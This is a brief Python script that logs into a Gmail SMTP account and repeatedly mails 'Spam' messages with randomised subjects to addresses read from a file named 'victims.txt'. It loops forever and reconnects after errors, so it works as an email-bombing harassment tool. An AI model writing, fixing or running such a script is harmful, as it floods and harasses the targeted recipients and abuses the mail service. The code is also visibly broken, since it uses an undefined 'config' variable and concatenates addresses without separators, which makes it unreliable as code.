import smtplib
from email.mime.text import MIMEText
import time
import random

login = open("login.txt", "r").read().split()
username = config[0]
password = config[1]

def start_server():
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.login(username, password)
    return server

def quit_server(server):
    server.quit()

def send_emails(server):
    emails = "".join(open("victims.txt", "r").read().split())
    for i in range(100):
        print(i)
        msg = MIMEText("Spam")
        msg['Subject'] = 'Spam ' + str(random.randint(0, 1000000))
        msg['From'] = username
        msg['To'] = emails
        server.sendmail(username, emails, msg.as_string())

def main():
    while True:
        server = start_server()
        try:
            send_emails(server)
        except Exception as e:
            time.sleep(60)

if __name__ == "__main__":
    main()
